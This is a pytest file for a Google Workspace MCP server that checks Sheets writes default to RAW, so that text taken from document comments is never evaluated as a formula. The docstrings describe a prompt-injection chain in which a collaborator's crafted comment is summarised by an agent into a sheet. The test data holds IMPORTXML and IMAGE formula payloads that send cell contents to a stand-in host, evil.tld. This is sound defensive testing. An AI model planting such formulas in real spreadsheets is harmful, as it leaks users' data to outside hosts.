"""A Sheets write defaults to `RAW`, at the MCP boundary as well as in the library.

`update_cells` and `append_rows` defaulted `valueInputOption` to **`USER_ENTERED`**, while every
Sheets write declaration in the library defaults to `RAW` — eight of them, across the `Backend`
protocol, both implementations and the `Sheet` façade. The tool layer sat above all eight and
overrode the safe default.

`USER_ENTERED` means *parse this as if a human typed it*. So text derived from a comment body —
authored by anyone who can comment on a shared document, which is `SECURITY.md`'s named primary
risk — became a live formula.

**Why that is worse here than the CSV case that got 0.24.0 yanked.** Sheets evaluates the
formula on **Google's servers**, and the import family (`IMPORTXML`, `IMPORTDATA`, `IMPORTFEED`,
`IMPORTHTML`, `IMPORTRANGE`, `IMAGE`) issues outbound requests from there, with other cells
concatenable into the URL. The 0.24.0 variant needed a human to open a file and click through a
warning. This one needs neither:

  * no sharing event, so DLP sees nothing
  * version history is irrelevant — the data has already left
  * the client's approval mode does not help: the call is a legitimate, correctly-annotated
    write, and `content.write` is on by default

The chain is ordinary, not contrived: a collaborator leaves a crafted comment, the operator asks
the agent to summarise comments into a tracking sheet, and the formula evaluates.

**The feature is legitimate; only the default was wrong.** `USER_ENTERED` remains available as an
explicit argument, and the last test here guards that — a fix that silently removed the ability
to write a real formula would be a different regression.

Companion to `tests/test_export_paths_and_injection.py`, which covers the CSV sibling. The three
export/write paths deliberately do NOT share one escaping helper: openpyxl infers a formula from
`=` only, Excel-on-CSV also from `+ - @`, and a `RAW` Sheets write needs no escaping at all.
Enforcement is per-format, so a single shared helper would be wrong in two directions at once.
"""
from __future__ import annotations

import asyncio
import inspect

import pytest

from csa_google_workspace import Workspace
from csa_google_workspace.backend import ApiBackend, Backend, FakeBackend
from csa_google_workspace.documents.sheet import Sheet
from csa_google_workspace.mcp import settings_from_env
from csa_google_workspace.mcp.server import create_server
from csa_google_workspace.policy import PolicyBackend

SHEET = "s1"
PAYLOAD = '=IMPORTXML("https://evil.tld/?d="&A1,"//x")'


def build():
    backend = FakeBackend(
        {SHEET: {"id": SHEET, "name": "Tracker",
                 "mimeType": "application/vnd.google-apps.spreadsheet"}},
        spreadsheets={SHEET: {"sheets": [{"properties": {"title": "Tab1", "sheetId": 0}}]}},
        values={(SHEET, "Tab1"): [["a"]]})
    st = settings_from_env({"CSA_GW_ALLOWLIST_READ": "*", "CSA_GW_ALLOWLIST_MODIFY": "*",
                            "CSA_GW_PROFILE": "full"})
    return create_server(lambda: Workspace(PolicyBackend(backend, st.policy)), settings=st), backend


def call(app, name, **args):
    return asyncio.run(app.call_tool(name, {**args})).structured_content


def options_used(backend):
    """Every `value_input_option` a Sheets write was actually issued with."""
    return [w[-1] for w in backend._writes if w[1].startswith("sheets_values_")]


class TestTheToolsDefaultToRaw:
    """The fix. Asserted on the option the backend was CALLED with, not on the signature."""

    def test_update_cells_stores_a_formula_as_text(self):
        app, backend = build()
        call(app, "update_cells", fileId=SHEET, a1Range="Tab1!A1", values=[[PAYLOAD]])
        assert options_used(backend) == ["RAW"], (
            f"a comment body reached Sheets as {options_used(backend)}; "
            f"USER_ENTERED evaluates it server-side")

    def test_append_rows_stores_a_formula_as_text(self):
        app, backend = build()
        call(app, "append_rows", fileId=SHEET, a1Range="Tab1", values=[[PAYLOAD]])
        assert options_used(backend) == ["RAW"]

    @pytest.mark.parametrize("payload", [
        '=IMPORTXML("https://evil.tld/?d="&A1,"//x")',
        "=IMPORTRANGE(\"1abc\",\"A1\")",
        '=IMAGE("https://evil.tld/p.png?d="&A1)',
        "=1+1",
        "+1+1", "-1+1", "@SUM(A1)",          # inert under RAW; dangerous under other readers
    ])
    def test_no_payload_shape_changes_the_option(self, payload):
        """The guard is unconditional. A default that inspected the value for `=` would miss
        the shapes each downstream reader treats differently."""
        app, backend = build()
        call(app, "update_cells", fileId=SHEET, a1Range="Tab1!A1", values=[[payload]])
        assert options_used(backend) == ["RAW"]


class TestUserEnteredIsNoLongerReachableThroughMcp:
    """**This class asserted the opposite until v0.30.13**, and the reversal is the point.

    v0.30.1 made `RAW` the default and kept `USER_ENTERED` reachable, under the heading *"the
    feature is legitimate; removing it would be its own regression"*. Half right: the feature is
    legitimate, and it stays in the library. What did not survive review is exposing it *here*.

    After the fix, the only thing standing between an injected agent and server-side formula
    evaluation was a docstring saying **DO NOT pass `USER_ENTERED` for anything derived from
    document or comment content** — an instruction to the model, on a surface whose entire
    premise (T2) is that third-party content can instruct the model.

    Invariant #10 records that *a type is not a contract with the model; the description is*.
    Here it inverts: **a description is not a control either.** So the parameter is gone rather
    than gated — the same shape as raw `batch_update`, which the library exposes and this layer
    withholds.

    What it costs is real and was weighed: an agent cannot compose a spreadsheet with live
    formulas through this server. `Sheet.update(..., value_input_option="USER_ENTERED")` is one
    import away for anyone who has decided.
    """

    def test_the_tools_no_longer_accept_it(self):
        app, _ = build()
        schemas = {t.name: t.input_schema for t in asyncio.run(app.list_tools())}
        for name in ("update_cells", "append_rows"):
            properties = schemas[name].get("properties", {})
            assert "valueInputOption" not in properties, (
                f"{name} still publishes valueInputOption; a parameter the schema advertises is "
                f"a parameter an injected agent can be told to set")

    @pytest.mark.parametrize("tool,a1", [("update_cells", "Tab1!A1"), ("append_rows", "Tab1")])
    def test_passing_it_anyway_is_ignored_and_raw_is_used(self, tool, a1):
        """Absent from the schema is not the same as rejected, so this checks what a caller who
        sends it regardless actually gets.

        Measured: the SDK **silently drops** the unknown argument and the write proceeds as
        `RAW`. A first draft of this test asserted it should *raise* — wrong, and wrong in the
        less safe direction.

        Silently ignoring an unknown parameter is normally a smell. Here it is the fail-safe
        outcome, because the value being ignored is the dangerous one: the only thing an
        injected agent achieves by sending the old parameter is the behaviour it was trying to
        avoid. Worth asserting explicitly rather than leaving to the SDK's discretion, since an
        SDK that later started honouring extra kwargs would reopen T15 in silence.
        """
        app, backend = build()
        call(app, tool, fileId=SHEET, a1Range=a1, values=[["=SUM(A1:A2)"]],
             valueInputOption="USER_ENTERED")
        assert options_used(backend) == ["RAW"], (
            "an unknown valueInputOption reached the backend; the parameter was removed from "
            "the surface precisely so it could not")

    @pytest.mark.parametrize("tool,a1", [("update_cells", "Tab1!A1"), ("append_rows", "Tab1")])
    def test_a_formula_shaped_string_is_stored_as_text(self, tool, a1):
        """The behaviour that matters, stated without reference to the parameter at all."""
        app, backend = build()
        call(app, tool, fileId=SHEET, a1Range=a1, values=[["=IMPORTXML(\"http://x\",\"//a\")"]])
        assert options_used(backend) == ["RAW"]

    def test_the_docstring_no_longer_argues_with_the_model_about_it(self):
        """A description that says "do not pass X" is a description that has to be believed. The
        replacement states what happens, and offers nothing to override."""
        app, _ = build()
        tools = {t.name: (t.description or "") for t in asyncio.run(app.list_tools())}
        text = tools["update_cells"]
        assert "USER_ENTERED" not in text, (
            "the description still names USER_ENTERED - there is nothing to name any more, and "
            "naming it teaches a parameter that does not exist")
        assert "verbatim" in text, "it must still say what DOES happen to the values"


class TestEveryLibraryDeclarationStillDefaultsToRaw:
    """Eight declarations, and the fix depends on all of them. A tool passing no option
    inherits whatever the layer beneath chose, so a single drifted default reopens this."""

    @pytest.mark.parametrize("owner,method", [
        (Backend, "sheets_values_update"), (Backend, "sheets_values_append"),
        (FakeBackend, "sheets_values_update"), (FakeBackend, "sheets_values_append"),
        (ApiBackend, "sheets_values_update"), (ApiBackend, "sheets_values_append"),
        (Sheet, "update"), (Sheet, "append_rows"),
    ])
    def test_the_default_is_raw(self, owner, method):
        sig = inspect.signature(getattr(owner, method))
        name = "value_input_option"
        assert name in sig.parameters, f"{owner.__name__}.{method} has no {name}"
        assert sig.parameters[name].default == "RAW", (
            f"{owner.__name__}.{method} defaults to "
            f"{sig.parameters[name].default!r}, not RAW")


class TestTheExportToSheetPremiseHolds:
    """`export_comments(destination="sheet")` must not deliver a live formula, and since #277
    there are TWO routes with TWO different mechanisms. Both are asserted, because the premise
    that made one safe says nothing about the other.

    * **XLSX upload** (openpyxl present - the normal case): `_build_xlsx` forces every data
      cell to text, so the archive carries an inline string rather than an `<f>` element. Probed
      2026-08-31: Drive's convert-on-upload PRESERVES that, and `=1+1` arrives as the string
      `=1+1` rather than as `2`.
    * **values API** (openpyxl absent): the write is `RAW`, so Sheets stores the text literally.
      This is the original premise - `_export.to_grid` skips escaping because of it - and it was
      a GLOBAL claim only LOCALLY true, which is why it is pinned here.
    """

    def _run(self):
        backend = FakeBackend(
            {SHEET: {"id": SHEET, "name": "Draft",
                     "mimeType": "application/vnd.google-apps.document"}},
            documents={SHEET: {"body": {"content": []}}},
            comments={SHEET: [{"id": "t1", "content": PAYLOAD,
                               "author": {"displayName": "Attacker"}, "resolved": False,
                               "replies": []}]})
        st = settings_from_env({"CSA_GW_ALLOWLIST_READ": "*", "CSA_GW_ALLOWLIST_MODIFY": "*",
                                "CSA_GW_PROFILE": "full"})
        app = create_server(lambda: Workspace(PolicyBackend(backend, st.policy)), settings=st)
        call(app, "export_comments", fileId=SHEET, destination="sheet")
        return backend

    def test_the_uploaded_workbook_carries_no_live_formula(self):
        import io
        import zipfile
        backend = self._run()
        uploaded = [f["_uploaded"] for f in backend._files.values() if "_uploaded" in f]
        assert uploaded, "destination=sheet should upload a workbook when openpyxl is present"
        with zipfile.ZipFile(io.BytesIO(uploaded[0]["content"])) as z:
            sheet = z.read("xl/worksheets/sheet1.xml").decode()
        assert "<f>" not in sheet, "the delivered register contains a live formula"
        assert "IMPORTXML" in sheet, "sanity: the payload should be present, as text"

    def test_the_values_fallback_is_written_raw(self):
        """The original premise, still pinned. Forced down the fallback by making the formatted
        route unavailable, so this cannot silently stop being exercised."""
        import csa_google_workspace._export as export_mod
        original = export_mod.xlsx_supported
        export_mod.xlsx_supported = lambda: False
        try:
            backend = self._run()
        finally:
            export_mod.xlsx_supported = original
        used = options_used(backend)
        assert used and set(used) == {"RAW"}, (
            f"the comment grid was written with {used}; `_export.py` skips escaping on the "
            f"premise that this path is RAW")

    def test_the_fallback_says_the_register_is_unformatted(self):
        """A quality drop must be stated, not silent - otherwise an unformatted register reads
        as the intended output."""
        import csa_google_workspace._export as export_mod
        original = export_mod.xlsx_supported
        export_mod.xlsx_supported = lambda: False
        try:
            backend = FakeBackend(
                {SHEET: {"id": SHEET, "name": "Draft",
                         "mimeType": "application/vnd.google-apps.document"}},
                documents={SHEET: {"body": {"content": []}}}, comments={SHEET: []})
            st = settings_from_env({"CSA_GW_ALLOWLIST_READ": "*",
                                    "CSA_GW_ALLOWLIST_MODIFY": "*", "CSA_GW_PROFILE": "full"})
            app = create_server(lambda: Workspace(PolicyBackend(backend, st.policy)),
                                settings=st)
            out = call(app, "export_comments", fileId=SHEET, destination="sheet")
        finally:
            export_mod.xlsx_supported = original
        assert "UNFORMATTED" in out["detail"] and "openpyxl" in out["detail"]
